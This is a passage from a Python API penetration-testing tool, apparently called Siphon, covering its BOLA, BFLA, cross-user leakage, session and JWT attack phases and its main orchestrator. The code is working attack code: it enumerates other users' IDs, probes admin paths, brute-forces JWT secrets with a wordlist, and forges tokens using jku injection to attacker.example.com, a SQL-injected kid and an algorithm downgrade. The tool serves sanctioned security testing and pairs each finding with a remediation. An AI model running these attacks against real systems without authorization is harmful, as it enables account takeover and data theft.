                id_endpoints.append((ep, ids))

    if not id_endpoints:
        # Probe /me or /profile to get own ID
        me_urls = ["/me", "/user/me", "/api/me", "/users/me", "/profile",
                   "/account", "/api/account"]
        for me_path in me_urls:
            url = root + me_path
            resp = _safe_get(auth_sess, url, timeout=timeout)
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    own_id = (data.get("id") or data.get("user_id") or
                              data.get("userId") or data.get("_id"))
                    if own_id:
                        con.info(f"Own user ID: {own_id}")
                        # Try adjacent IDs
                        for delta in (1, -1, 2, 100):
                            test_id = int(own_id) + delta if str(own_id).isdigit() else own_id
                            test_url = root + f"/users/{test_id}"
                            test_resp = _safe_get(auth_sess, test_url, timeout=timeout)
                            if test_resp and test_resp.status_code == 200:
                                try:
                                    test_data = test_resp.json()
                                    resp_id = (test_data.get("id") or test_data.get("user_id") or
                                               test_data.get("userId"))
                                    if resp_id and str(resp_id) != str(own_id):
                                        output.add_finding(
                                            phase="bola",
                                            title="BOLA — Broken Object Level Authorization",
                                            severity="CRITICAL",
                                            url=test_url,
                                            detail=(f"Accessed another user's object (ID {test_id}) "
                                                    f"using own auth credentials."),
                                            evidence=f"Own ID: {own_id}, accessed ID: {test_id}",
                                            remediation=(
                                                "Verify object ownership on every request; "
                                                "never rely solely on user-supplied IDs."
                                            ),
                                        )
                                except Exception:
                                    pass
                except Exception:
                    pass

    # Test ID enumeration on discovered ID endpoints
    for ep, param_ids in id_endpoints[:5]:
        if _shutdown_requested:
            break
        path_template = ep["path"]
        for param in param_ids[:1]:
            for test_id in ("1", "2", "3", "999999", "0"):
                if "{" + param + "}" in path_template:
                    test_path = path_template.replace("{" + param + "}", test_id)
                elif ":" + param in path_template:
                    test_path = path_template.replace(":" + param, test_id)
                else:
                    test_path = path_template

                url = root + test_path
                resp = _safe_get(auth_sess, url, timeout=timeout)
                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                        resp_id = (data.get("id") or data.get("user_id") or
                                   data.get("userId") or data.get("_id"))
                        if resp_id and str(resp_id) != test_id:
                            output.add_finding(
                                phase="bola",
                                title="BOLA — Object Enumeration Possible",
                                severity="HIGH",
                                url=url,
                                detail=(f"Endpoint returns object with different ID than requested. "
                                        f"Requested {test_id}, got {resp_id}."),
                                evidence=f"Path: {test_path}, response id: {resp_id}",
                                remediation="Validate that the returned object belongs to the requester.",
                            )
                            break
                    except Exception:
                        pass

    con.status("bola", "done", "BOLA testing complete")


# ---------------------------------------------------------------------------
# Phase 11: BFLA
# ---------------------------------------------------------------------------

_ADMIN_PATHS = [
    "/admin",
    "/api/admin",
    "/management",
    "/api/management",
    "/admin/users",
    "/api/users",
    "/api/admin/users",
    "/internal",
    "/api/internal",
    "/debug",
    "/api/debug",
    "/api/settings",
    "/api/config",
    "/api/roles",
    "/api/permissions",
    "/superadmin",
    "/api/superadmin",
    "/api/audit",
    "/api/logs",
]


def phase_bfla(settings: dict, auth_sess, output: OutputManager,
               inventory: list) -> None:
    """Phase 11: BFLA — function-level authorization bypass."""
    if auth_sess is None:
        con.status("bfla", "skip", "Auth session required")
        return

    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("bfla", "running", "Testing function-level authorization bypass")

    # Find admin-like paths in inventory
    admin_inventory = [ep for ep in inventory
                       if re.search(r'(admin|manage|internal|debug|config|settings|'
                                    r'audit|log|role|permission|superadmin)', ep["path"], re.I)]

    # Also probe hardcoded admin paths
    test_paths = list({ep["path"] for ep in admin_inventory})
    test_paths += _ADMIN_PATHS

    found_bfla = False
    for path in test_paths[:25]:
        if _shutdown_requested:
            break
        url = root + path
        resp = _safe_get(auth_sess, url, timeout=timeout)
        if resp and resp.status_code in (200, 201):
            try:
                data = resp.json()
                # Check if response looks like admin data
                keys = _extract_json_keys(data)
                admin_indicators = any(
                    re.search(r'(user.*list|all.*user|admin|role|permission|config|setting)',
                              k, re.I)
                    for k in keys
                )
                if admin_indicators or (isinstance(data, list) and len(data) > 1):
                    output.add_finding(
                        phase="bfla",
                        title="BFLA — Broken Function Level Authorization",
                        severity="CRITICAL",
                        url=url,
                        detail=(f"Regular user can access privileged endpoint: {path}"),
                        evidence=f"HTTP {resp.status_code}, response keys: {keys[:5]}",
                        remediation=(
                            "Implement role-based access control; "
                            "verify user role on every function call."
                        ),
                    )
                    found_bfla = True
            except Exception:
                # Non-JSON 200 on admin path
                if len(resp.text) > 100:
                    output.add_finding(
                        phase="bfla",
                        title="BFLA — Admin Endpoint Accessible",
                        severity="HIGH",
                        url=url,
                        detail=f"Admin-like endpoint returns HTTP 200 for regular user: {path}",
                        evidence=f"HTTP {resp.status_code}: {resp.text[:200]}",
                        remediation="Enforce authorization checks on all admin endpoints.",
                    )

    if not found_bfla:
        con.info("No BFLA vulnerabilities detected")

    con.status("bfla", "done", "BFLA testing complete")


# ---------------------------------------------------------------------------
# Phase 12: Cross-User Data Leakage
# ---------------------------------------------------------------------------

def phase_cross_user(settings: dict, auth_sess, auth2_sess,
                     output: OutputManager, inventory: list) -> None:
    """Phase 12: Cross-user data leakage testing."""
    if auth_sess is None or auth2_sess is None:
        con.status("cross_user", "skip", "Both auth and auth2 sessions required")
        return

    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("cross_user", "running", "Testing cross-user data leakage")

    # Get user1 identity
    user1_id = None
    user1_resources: dict = {}
    me_paths = ["/me", "/user/me", "/users/me", "/profile", "/account", "/api/me"]

    for me_path in me_paths:
        url = root + me_path
        resp = _safe_get(auth_sess, url, timeout=timeout)
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                user1_id = (data.get("id") or data.get("user_id") or
                            data.get("userId") or data.get("_id"))
                if user1_id:
                    user1_resources["me"] = {"path": me_path, "data": data}
                    break
            except Exception:
                pass

    if not user1_id:
        con.info("Could not determine user1 identity for cross-user test")
        con.status("cross_user", "done", "Could not determine user identity")
        return

    con.info(f"User1 ID: {user1_id}")

    # Now try to access user1's resources as user2
    # Find GET endpoints with ID parameters
    id_endpoints = [ep for ep in inventory
                    if ep["method"] == "GET" and _extract_path_ids(ep["path"])]

    test_paths_to_try = [ep["path"] for ep in id_endpoints[:10]]
    # Also try generic user paths
    test_paths_to_try += [
        f"/users/{user1_id}",
        f"/api/users/{user1_id}",
        f"/user/{user1_id}",
        f"/accounts/{user1_id}",
        f"/profile/{user1_id}",
    ]

    for path in test_paths_to_try[:15]:
        if _shutdown_requested:
            break
        # Substitute user1_id into path templates
        test_path = path
        for param in _extract_path_ids(path):
            if "{" + param + "}" in test_path:
                test_path = test_path.replace("{" + param + "}", str(user1_id))
            elif ":" + param in test_path:
                test_path = test_path.replace(":" + param, str(user1_id))

        url = root + test_path
        resp = _safe_get(auth2_sess, url, timeout=timeout)
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                resp_id = (data.get("id") or data.get("user_id") or
                           data.get("userId") or data.get("_id"))
                if resp_id and str(resp_id) == str(user1_id):
                    output.add_finding(
                        phase="cross_user",
                        title="Cross-User Data Leakage",
                        severity="CRITICAL",
                        url=url,
                        detail=(f"User2 can access User1's data (ID {user1_id}) "
                                f"at {test_path}."),
                        evidence=f"User2 got user1 resource: {json.dumps(data)[:300]}",
                        remediation=(
                            "Enforce object-level authorization; "
                            "verify resource ownership on each request."
                        ),
                    )
            except Exception:
                pass

    con.status("cross_user", "done", "Cross-user leakage testing complete")


# ---------------------------------------------------------------------------
# Phase 13: Session / Token Management
# ---------------------------------------------------------------------------

def phase_session(settings: dict, auth_sess, output: OutputManager,
                  inventory: list) -> None:
    """Phase 13: API session and token management analysis."""
    if auth_sess is None:
        con.status("session", "skip", "Auth session required")
        return

    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("session", "running", "Analyzing session/token management")

    token = auth_sess.headers.get("Authorization", "")
    if token.startswith("Bearer "):
        raw_token = token[7:].strip()
        decoded = _jwt_decode_token(raw_token)

        if decoded:
            header, payload, _ = decoded

            # Check expiry
            if "exp" not in payload:
                output.add_finding(
                    phase="session",
                    title="JWT Missing Expiry Claim",
                    severity="MEDIUM",
                    url=base_url,
                    detail="JWT access token does not contain an 'exp' (expiration) claim.",
                    evidence=f"JWT payload: {json.dumps(payload)}",
                    remediation="Always include short-lived 'exp' claims in JWT tokens.",
                )

            # Check iat claim
            if "iat" not in payload:
                output.add_finding(
                    phase="session",
                    title="JWT Missing Issued-At Claim",
                    severity="LOW",
                    url=base_url,
                    detail="JWT does not contain an 'iat' (issued at) claim.",
                    evidence=f"JWT payload: {json.dumps(payload)}",
                    remediation="Include 'iat' claim for token auditing and refresh policy enforcement.",
                )

            # Check algorithm
            alg = header.get("alg", "")
            if alg.lower() in ("none", ""):
                output.add_finding(
                    phase="session",
                    title="JWT Uses Insecure Algorithm",
                    severity="CRITICAL",
                    url=base_url,
                    detail=f"JWT algorithm is '{alg}', which provides no security.",
                    evidence=f"JWT header: {json.dumps(header)}",
                    remediation="Use RS256 or HS256 with a strong secret.",
                )
            elif alg == "HS256":
                output.add_finding(
                    phase="session",
                    title="JWT Uses Symmetric Algorithm (HS256)",
                    severity="LOW",
                    url=base_url,
                    detail="HS256 requires sharing the secret key; RS256 is preferred for APIs.",
                    evidence=f"JWT alg: {alg}",
                    remediation="Consider RS256 asymmetric signing for better key management.",
                )

    # Check logout + replay
    logout_paths = ["/logout", "/api/logout", "/auth/logout", "/signout", "/api/signout"]
    logout_url = None
    for lp in logout_paths:
        url = root + lp
        resp = _safe_request(auth_sess, "POST", url, timeout=timeout)
        if resp and resp.status_code in (200, 204):
            logout_url = url
            break

    if logout_url:
        # Try to use the token after logout
        test_endpoints = [ep for ep in inventory if ep["method"] == "GET"][:3]
        for ep in test_endpoints:
            url = root + ep["path"]
            replay_resp = _safe_get(auth_sess, url, timeout=timeout)
            if replay_resp and replay_resp.status_code == 200:
                output.add_finding(
                    phase="session",
                    title="JWT Token Not Invalidated After Logout",
                    severity="HIGH",
                    url=url,
                    detail="Token remains valid after logout endpoint was called.",
                    evidence=f"POST {logout_url} -> 200, then GET {url} -> 200",
                    remediation=(
                        "Maintain a token denylist or use short-lived tokens with "
                        "refresh token rotation; invalidate tokens server-side on logout."
                    ),
                )
                break

    con.status("session", "done", "Session analysis complete")


# ---------------------------------------------------------------------------
# Phase 14: JWT Advanced Attacks
# ---------------------------------------------------------------------------

_JWT_WORDLIST = [
    "secret", "password", "123456", "jwt_secret", "api_key",
    "changeme", "mysecret", "token", "jwt", "supersecret",
    "test", "dev", "key", "private", "hs256", "default",
    "qwerty", "letmein", "admin", "root", "pass", "master",
    "access", "verify", "sign", "itsasecret", "shhhh",
    "hello", "world", "app_secret", "flask_secret", "django_secret",
]


def phase_jwt(settings: dict, auth_sess, output: OutputManager,
              inventory: list) -> None:
    """Phase 14: JWT advanced attacks."""
    if auth_sess is None:
        con.status("jwt", "skip", "Auth session required")
        return

    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("jwt", "running", "Running advanced JWT attack suite")

    token_hdr = auth_sess.headers.get("Authorization", "")
    if not token_hdr.startswith("Bearer "):
        con.status("jwt", "skip", "No Bearer token in auth session")
        return

    raw_token = token_hdr[7:].strip()
    decoded = _jwt_decode_token(raw_token)
    if not decoded:
        con.status("jwt", "skip", "Could not decode token as JWT")
        return

    header, payload, signature = decoded

    # Find a protected endpoint to probe
    test_endpoints = ([ep for ep in inventory if ep.get("auth_required")] or
                      inventory[:3])
    probe_url = (root + test_endpoints[0]["path"]) if test_endpoints else base_url

    # 1. HMAC secret brute force (expanded wordlist)
    jwt_secret_cfg = scan.get("jwt_secret", "")
    wordlist = list(_JWT_WORDLIST)
    if jwt_secret_cfg:
        wordlist.insert(0, jwt_secret_cfg)

    cracked_secret = None
    for secret in wordlist:
        forged = _jwt_forge_hs256(raw_token, secret)
        if not forged:
            continue
        test_sess = _make_session(settings)
        test_sess.headers["Authorization"] = f"Bearer {forged}"
        resp = _safe_get(test_sess, probe_url, timeout=timeout)
        if resp and resp.status_code in (200, 201):
            cracked_secret = secret
            output.add_finding(
                phase="jwt",
                title="JWT HMAC Secret Cracked",
                severity="CRITICAL",
                url=probe_url,
                detail=f"JWT was re-signed with cracked secret '{secret}' and accepted by server.",
                evidence=f"Cracked secret: '{secret}'",
                remediation="Replace JWT secret with a cryptographically random 256-bit key.",
            )
            break

    # 2. jku injection
    if "jku" not in header:
        # Inject jku pointing to attacker-controlled location (just flag the test)
        try:
            new_header = dict(header)
            new_header["jku"] = "https://attacker.example.com/jwks.json"
            h = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
            p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            injected_token = f"{h}.{p}."
            test_sess = _make_session(settings)
            test_sess.headers["Authorization"] = f"Bearer {injected_token}"
            resp = _safe_get(test_sess, probe_url, timeout=timeout)
            if resp and resp.status_code in (200, 201):
                output.add_finding(
                    phase="jwt",
                    title="JWT jku Header Injection",
                    severity="CRITICAL",
                    url=probe_url,
                    detail="Server fetched and trusted JWK from injected jku header URL.",
                    evidence="Token with injected jku accepted",
                    remediation="Never trust the jku header; pin the JWKS endpoint server-side.",
                )
        except Exception:
            pass

    # 3. kid parameter injection (SQL injection in kid)
    if "kid" in header:
        try:
            new_header = dict(header)
            new_header["kid"] = "' UNION SELECT 'attackerkey'--"
            h = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
            p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            # Sign with 'attackerkey'
            sig = hmac.new(b"attackerkey", f"{h}.{p}".encode(), hashlib.sha256).digest()
            injected_token = f"{h}.{p}.{_b64url_encode(sig)}"
            test_sess = _make_session(settings)
            test_sess.headers["Authorization"] = f"Bearer {injected_token}"
            resp = _safe_get(test_sess, probe_url, timeout=timeout)
            if resp and resp.status_code in (200, 201):
                output.add_finding(
                    phase="jwt",
                    title="JWT kid SQL Injection",
                    severity="CRITICAL",
                    url=probe_url,
                    detail="SQL injection payload in JWT kid header was accepted.",
                    evidence="kid-injected token accepted by server",
                    remediation="Validate and sanitize the kid header; use parameterized key lookups.",
                )
        except Exception:
            pass

    # 4. Algorithm confusion: try HS256 with public key as secret
    # (if alg is RS256 or ES256, try signing with HS256)
    if header.get("alg", "").startswith("RS"):
        # Try sending an HS256 token (public key as secret is empty here)
        try:
            new_header = dict(header)
            new_header["alg"] = "HS256"
            h = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
            p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            # Use empty key (public key not available in automated scan)
            sig = hmac.new(b"", f"{h}.{p}".encode(), hashlib.sha256).digest()
            injected_token = f"{h}.{p}.{_b64url_encode(sig)}"
            test_sess = _make_session(settings)
            test_sess.headers["Authorization"] = f"Bearer {injected_token}"
            resp = _safe_get(test_sess, probe_url, timeout=timeout)
            if resp and resp.status_code in (200, 201):
                output.add_finding(
                    phase="jwt",
                    title="JWT Algorithm Confusion Attack (RS256 → HS256)",
                    severity="CRITICAL",
                    url=probe_url,
                    detail="Server accepted HS256 token when RS256 was expected (algorithm confusion).",
                    evidence="Downgraded RS256 → HS256 token accepted",
                    remediation="Enforce expected algorithm server-side; reject algorithm downgrades.",
                )
        except Exception:
            pass

    con.status("jwt", "done", "JWT advanced testing complete")


# ---------------------------------------------------------------------------
# main()
# ---------------------------------------------------------------------------

def main() -> None:
    _install_signal_handlers()

    args = _parse_args()

    if args.list_phases:
        print(f"\nSiphon v{VERSION} — Phase List\n")
        for name, desc in PHASE_LIST:
            print(f"  {name:<18} {desc}")
        print()
        sys.exit(0)

    if not _MANAGED:
        con.banner(BANNER)
        print(f"  Siphon — API Penetration Testing Orchestrator v{VERSION}")
        print(f"  OWASP API Security Top 10 2023\n")

    # Load and merge settings
    settings = _load_settings(args.settings)
    settings = _apply_args(settings, args)
    scan = settings["scan"]

    # Validate target
    if not scan["api_base_url"]:
        con.err("No API base URL specified. Use --url or set scan.api_base_url in settings.")
        sys.exit(1)

    target = _parse_target(scan["api_base_url"])
    con.info(f"Target   : {target['url']}")
    con.info(f"Project  : {scan['project']}")
    con.info(f"Threads  : {scan['threads']}")
    con.info(f"Timeout  : {scan['timeout']}s")
    if scan.get("proxy"):
        con.info(f"Proxy    : {scan['proxy']}")

    # Phase flags
    phases_cfg = scan.get("phases", {})

    def _skip(phase: str) -> bool:
        return not phases_cfg.get(phase, True)

    # Build HTTP sessions
    sess       = _make_session(settings)
    auth_sess  = _build_auth_session(settings, "auth")
    auth2_sess = _build_auth_session(settings, "auth2")

    if auth_sess:
        con.info("Auth     : enabled (primary)")
    if auth2_sess:
        con.info("Auth2    : enabled (secondary)")

    # Output manager
    output = OutputManager(scan["project"])

    # Shared API inventory (populated by discovery, used by later phases)
    api_inventory: list = []

    con.section("Starting Siphon API Penetration Test")

    # ------------------------------------------------------------------
    # Phase 0: Discovery
    # ------------------------------------------------------------------
    if not _skip("discovery"):
        try:
            api_inventory = phase_discovery(settings, sess, output)
        except Exception as exc:
            con.err(f"Phase discovery error: {exc}")
    else:
        con.status("discovery", "skip", "Disabled in settings")

    if _shutdown_requested:
        output.save_all(api_inventory)
        output.print_summary()
        sys.exit(0)

    # ------------------------------------------------------------------
    # Phase 1: Recon
    # ------------------------------------------------------------------
    if not _skip("recon"):
        try:
            phase_recon(settings, sess, output)
        except Exception as exc:
            con.err(f"Phase recon error: {exc}")
    else:
        con.status("recon", "skip", "Disabled in settings")

    if _shutdown_requested:
        output.save_all(api_inventory)
        output.print_summary()
        sys.exit(0)

    # ------------------------------------------------------------------
    # Phase 2: Fuzzing
    # ------------------------------------------------------------------
    if not _skip("fuzzing"):
        try:
            phase_fuzzing(settings, sess, output, api_inventory)
        except Exception as exc:
            con.err(f"Phase fuzzing error: {exc}")
    else:
        con.status("fuzzing", "skip", "Disabled in settings")

    if _shutdown_requested:
        output.save_all(api_inventory)
        output.print_summary()
        sys.exit(0)

    # ------------------------------------------------------------------
    # Phase 3: Injection
    # ------------------------------------------------------------------
    if not _skip("injection"):
        try:
            phase_injection(settings, sess, output, api_inventory)
        except Exception as exc:
            con.err(f"Phase injection error: {exc}")
    else:
        con.status("injection", "skip", "Disabled in settings")

    if _shutdown_requested:
        output.save_all(api_inventory)
        output.print_summary()
        sys.exit(0)

    # ------------------------------------------------------------------
    # Phase 4: Auth Bypass
    # ------------------------------------------------------------------
    if not _skip("auth_bypass"):
        try:
            phase_auth_bypass(settings, sess, auth_sess, output, api_inventory)
        except Exception as exc:
            con.err(f"Phase auth_bypass error: {exc}")
    else:
        con.status("auth_bypass", "skip", "Disabled in settings")

    if _shutdown_requested:
        output.save_all(api_inventory)
        output.print_summary()
        sys.exit(0)

    # ------------------------------------------------------------------
    # Phase 5: Rate Limiting
    # ------------------------------------------------------------------
    if not _skip("rate_limiting"):
        try:
            phase_rate_limiting(settings, sess, output, api_inventory)
        except Exception as exc:
            con.err(f"Phase rate_limiting error: {exc}")
    else:
        con.status("rate_limiting", "skip", "Disabled in settings")

    if _shutdown_requested:
        output.save_all(api_inventory)
        output.print_summary()
        sys.exit(0)

    # ------------------------------------------------------------------
    # Phase 6: Mass Assignment
    # ------------------------------------------------------------------
    if not _skip("mass_assignment"):
        try:
            phase_mass_assignment(settings, sess, auth_sess, output, api_inventory)
        except Exception as exc:
            con.err(f"Phase mass_assignment error: {exc}")
    else:
        con.status("mass_assignment", "skip", "Disabled in settings")

    if _shutdown_requested:
        output.save_all(api_inventory)
        output.print_summary()
        sys.exit(0)

    # ------------------------------------------------------------------
    # Phase 7: SSRF
    # ------------------------------------------------------------------
    if not _skip("ssrf"):
        try:
            phase_ssrf(settings, sess, auth_sess, output, api_inventory)
        except Exception as exc:
            con.err(f"Phase ssrf error: {exc}")
    else:
        con.status("ssrf", "skip", "Disabled in settings")

    if _shutdown_requested:
        output.save_all(api_inventory)
        output.print_summary()
        sys.exit(0)

    # ------------------------------------------------------------------
    # Phase 8: Data Exposure
    # ------------------------------------------------------------------
    if not _skip("data_exposure"):
        try:
            phase_data_exposure(settings, sess, auth_sess, output, api_inventory)
        except Exception as exc:
            con.err(f"Phase data_exposure error: {exc}")
    else:
        con.status("data_exposure", "skip", "Disabled in settings")

    if _shutdown_requested:
        output.save_all(api_inventory)
        output.print_summary()
        sys.exit(0)

    # ------------------------------------------------------------------
    # Phase 9: GraphQL
    # ------------------------------------------------------------------
    if not _skip("graphql"):
        try:
            phase_graphql(settings, sess, auth_sess, output)
        except Exception as exc:
            con.err(f"Phase graphql error: {exc}")
    else:
        con.status("graphql", "skip", "Disabled in settings")

    if _shutdown_requested:
        output.save_all(api_inventory)
        output.print_summary()
        sys.exit(0)

    # ------------------------------------------------------------------
    # Phase 10: BOLA
    # ------------------------------------------------------------------
    if not _skip("bola"):
        try:
            phase_bola(settings, auth_sess, output, api_inventory)
        except Exception as exc:
            con.err(f"Phase bola error: {exc}")
    else:
        con.status("bola", "skip", "Disabled in settings")

    if _shutdown_requested:
        output.save_all(api_inventory)
        output.print_summary()
        sys.exit(0)

    # ------------------------------------------------------------------
    # Phase 11: BFLA
    # ------------------------------------------------------------------
    if not _skip("bfla"):
        try:
            phase_bfla(settings, auth_sess, output, api_inventory)
        except Exception as exc:
            con.err(f"Phase bfla error: {exc}")
    else:
        con.status("bfla", "skip", "Disabled in settings")

    if _shutdown_requested:
        output.save_all(api_inventory)
        output.print_summary()
        sys.exit(0)

    # ------------------------------------------------------------------
    # Phase 12: Cross-User
    # ------------------------------------------------------------------
    if not _skip("cross_user"):
        try:
            phase_cross_user(settings, auth_sess, auth2_sess, output, api_inventory)
        except Exception as exc:
            con.err(f"Phase cross_user error: {exc}")
    else:
        con.status("cross_user", "skip", "Disabled in settings")

    if _shutdown_requested:
        output.save_all(api_inventory)
        output.print_summary()
        sys.exit(0)

    # ------------------------------------------------------------------
    # Phase 13: Session
    # ------------------------------------------------------------------
    if not _skip("session"):
        try:
            phase_session(settings, auth_sess, output, api_inventory)
        except Exception as exc:
            con.err(f"Phase session error: {exc}")
    else:
        con.status("session", "skip", "Disabled in settings")

    if _shutdown_requested:
        output.save_all(api_inventory)
        output.print_summary()
        sys.exit(0)

    # ------------------------------------------------------------------
    # Phase 14: JWT
    # ------------------------------------------------------------------
    if not _skip("jwt"):
        try:
            phase_jwt(settings, auth_sess, output, api_inventory)
        except Exception as exc:
            con.err(f"Phase jwt error: {exc}")
    else:
        con.status("jwt", "skip", "Disabled in settings")

    # ------------------------------------------------------------------
    # Save all results
    # ------------------------------------------------------------------
    output.save_all(api_inventory)
    output.print_summary()
    con.info(f"Reports saved to: {scan['project']}/")


if __name__ == "__main__":
    main()
